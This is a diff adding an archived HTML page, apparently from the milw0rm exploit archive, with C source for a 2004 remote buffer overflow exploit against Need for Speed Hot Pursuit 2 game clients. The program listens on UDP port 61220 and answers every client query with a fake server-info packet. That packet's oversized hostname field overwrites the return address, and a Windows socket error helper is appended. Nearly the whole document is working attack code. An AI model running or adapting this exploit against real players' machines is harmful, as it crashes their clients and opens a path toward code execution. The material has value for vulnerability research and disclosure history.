@@ -1,0 +1,261 @@
+<html>
+<head>
+<title>Need for Speed 2 Remote Client Buffer Overflow Exploit
+</title>
+<pre>
+/*
+
+Need for Speed 2 Remote Client Buffer Overflow Exploit - 23.01.2004
+
+by Luigi Auriemma
+
+UNIX &amp; WIN VERSION
+*/
+
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+#ifdef WIN32
+#include &lt;winsock.h&gt;
+#include &quot;winerr.h&quot;
+
+#define close closesocket
+#else
+#include &lt;unistd.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;netdb.h&gt;
+#endif
+
+
+
+
+
+
+#define VER &quot;0.1&quot;
+#define BUFFSZ 2048
+#define PORT 61220
+#define RETADD 0xdeadc0de
+#define RETOFF 540
+#define NFS240 &quot;18022640&quot;
+#define NFS242 &quot;18088178&quot;
+#define NFSOFF 669 /* referred to pck[] nver, don't change it */
+
+
+
+
+
+
+void std_err(void);
+
+
+
+
+
+
+int main(int argc, char *argv[]) {
+int sd,
+err,
+on = 1,
+psz;
+struct sockaddr_in peer;
+u_char *buff,
+pck[] =
+&quot;\\gamename\\nfs6&quot;
+&quot;\\gamever\\240&quot; // it is useless
+&quot;\\hostname\\&quot;
+&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
+&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
+&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
+&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
+&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
+&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
+&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
+&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
+&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
+&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
+&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
+&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
+&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
+&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
+&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
+&quot;aaaaaaaaaaaaaaaaaaaaaaaa&quot;
+&quot;0000&quot; // return address
+&quot;\\hostport\\8511&quot;
+&quot;\\mapname\\Fall Winds&quot;
+&quot;\\gametype\\Single Race&quot;
+&quot;\\numplayers\\1&quot;
+&quot;\\maxplayers\\8&quot;
+&quot;\\gamemode\\openplaying&quot;
+&quot;\\pbmd\\0&quot;
+&quot;\\password\\0&quot;
+&quot;\\nver\\&quot; NFS240
+&quot;\\ctid\\6&quot;
+&quot;\\res\\38&quot;
+&quot;\\dir\\0&quot;
+&quot;\\laps\\2&quot;
+&quot;\\ded\\0&quot;
+&quot;\\final\\&quot;
+&quot;\\queryid\\2.1&quot;;
+
+
+setbuf(stdout, NULL);
+
+fputs(&quot;\n&quot;
+&quot;Need for Speed Hot pursuit 2 &lt;= 242 client's buffer overflow &quot;VER&quot;\n&quot;
+&quot;by Luigi Auriemma\n&quot;
+&quot;e-mail: aluigi@altervista.org\n&quot;
+&quot;web: http://aluigi.altervista.org\n&quot;
+&quot;\n&quot;, stdout);
+
+if(argc &lt; 2) {
+printf(&quot;\nUsage: %s &lt;version&gt;\n&quot;
+&quot;\n&quot;
+&quot;Version:\n&quot;
+&quot;240 = this is the default (1.0) and more diffused version\n&quot;
+&quot;242 = the latest patched version, rarely used by players\n&quot;
+&quot;\n&quot;, argv[0]);
+exit(1);
+}
+
+
+if(!memcmp(argv[1], &quot;240&quot;, 3)) {
+printf(&quot;Selected version 240 (nver %s)\n&quot;, NFS240);
+} else if(!memcmp(argv[1], &quot;242&quot;, 3)) {
+printf(&quot;Selected version 242 (nver %s)\n&quot;, NFS242);
+memcpy(pck + NFSOFF, NFS242, sizeof(NFS242) - 1);
+} else {
+printf(&quot;\nError: you must choose between 240 and 242 only\n&quot;);
+exit(1);
+}
+
+
+#ifdef WIN32
+WSADATA wsadata;
+WSAStartup(MAKEWORD(1,0), &amp;wsadata);
+#endif
+
+sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+if(sd &lt; 0) std_err();
+
+peer.sin_addr.s_addr = INADDR_ANY;
+peer.sin_port = htons(PORT);
+peer.sin_family = AF_INET;
+psz = sizeof(peer);
+
+printf(&quot;\nBinding UDP port %u\n&quot;, PORT);
+
+err = setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&amp;on, sizeof(on));
+if(err &lt; 0) std_err();
+err = bind(sd, (struct sockaddr *)&amp;peer, psz);
+if(err &lt; 0) std_err();
+
+printf(&quot;The return address will be overwritten with 0x%08x\n&quot;, RETADD);
+*(u_long *)(pck + RETOFF) = RETADD;
+
+buff = malloc(BUFFSZ);
+if(!buff) std_err();
+
+fputs(&quot;Clients:\n&quot;, stdout);
+while(1) {
+err = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&amp;peer, &amp;psz);
+if(err &lt; 0) std_err();
+
+printf(&quot;%16s:%hu -&gt; &quot;,
+inet_ntoa(peer.sin_addr), htons(peer.sin_port));
+
+err = sendto(sd, pck, sizeof(pck) - 1, 0, (struct sockaddr *)&amp;peer, psz);
+if(err &lt; 0) std_err();
+fputs(&quot;BOOM\n&quot;, stdout);
+}
+
+close(sd);
+return(0);
+}
+
+
+#ifndef WIN32
+void std_err(void) {
+perror(&quot;\nError&quot;);
+exit(1);
+}
+#endif
+
+
+
+/*
+Header file used for manage errors in Windows
+It support socket and errno too
+(this header replace the previous sock_errX.h)
+*/
+
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+
+
+void std_err(void) {
+char *error;
+
+switch(WSAGetLastError()) {
+case 10004: error = &quot;Interrupted system call&quot;; break;
+case 10009: error = &quot;Bad file number&quot;; break;
+case 10013: error = &quot;Permission denied&quot;; break;
+case 10014: error = &quot;Bad address&quot;; break;
+case 10022: error = &quot;Invalid argument (not bind)&quot;; break;
+case 10024: error = &quot;Too many open files&quot;; break;
+case 10035: error = &quot;Operation would block&quot;; break;
+case 10036: error = &quot;Operation now in progress&quot;; break;
+case 10037: error = &quot;Operation already in progress&quot;; break;
+case 10038: error = &quot;Socket operation on non-socket&quot;; break;
+case 10039: error = &quot;Destination address required&quot;; break;
+case 10040: error = &quot;Message too long&quot;; break;
+case 10041: error = &quot;Protocol wrong type for socket&quot;; break;
+case 10042: error = &quot;Bad protocol option&quot;; break;
+case 10043: error = &quot;Protocol not supported&quot;; break;
+case 10044: error = &quot;Socket type not supported&quot;; break;
+case 10045: error = &quot;Operation not supported on socket&quot;; break;
+case 10046: error = &quot;Protocol family not supported&quot;; break;
+case 10047: error = &quot;Address family not supported by protocol family&quot;; break;
+case 10048: error = &quot;Address already in use&quot;; break;
+case 10049: error = &quot;Can't assign requested address&quot;; break;
+case 10050: error = &quot;Network is down&quot;; break;
+case 10051: error = &quot;Network is unreachable&quot;; break;
+case 10052: error = &quot;Net dropped connection or reset&quot;; break;
+case 10053: error = &quot;Software caused connection abort&quot;; break;
+case 10054: error = &quot;Connection reset by peer&quot;; break;
+case 10055: error = &quot;No buffer space available&quot;; break;
+case 10056: error = &quot;Socket is already connected&quot;; break;
+case 10057: error = &quot;Socket is not connected&quot;; break;
+case 10058: error = &quot;Can't send after socket shutdown&quot;; break;
+case 10059: error = &quot;Too many references, can't splice&quot;; break;
+case 10060: error = &quot;Connection timed out&quot;; break;
+case 10061: error = &quot;Connection refused&quot;; break;
+case 10062: error = &quot;Too many levels of symbolic links&quot;; break;
+case 10063: error = &quot;File name too long&quot;; break;
+case 10064: error = &quot;Host is down&quot;; break;
+case 10065: error = &quot;No Route to Host&quot;; break;
+case 10066: error = &quot;Directory not empty&quot;; break;
+case 10067: error = &quot;Too many processes&quot;; break;
+case 10068: error = &quot;Too many users&quot;; break;
+case 10069: error = &quot;Disc Quota Exceeded&quot;; break;
+case 10070: error = &quot;Stale NFS file handle&quot;; break;
+case 10091: error = &quot;Network SubSystem is unavailable&quot;; break;
+case 10092: error = &quot;WINSOCK DLL Version out of range&quot;; break;
+case 10093: error = &quot;Successful WSASTARTUP not yet performed&quot;; break;
+case 10071: error = &quot;Too many levels of remote in path&quot;; break;
+case 11001: error = &quot;Host not found&quot;; break;
+case 11002: error = &quot;Non-Authoritative Host not found&quot;; break;
+case 11003: error = &quot;Non-Recoverable errors: FORMERR, REFUSED, NOTIMP&quot;; break;
+case 11004: error = &quot;Valid name, no data record of requested type&quot;; break;
+default: error = strerror(errno); break;
+}
+fprintf(stderr, &quot;\nError: %s\n&quot;, error);
+exit(1);
+}
+</pre>
+//milw0rm.com
+</html>
+
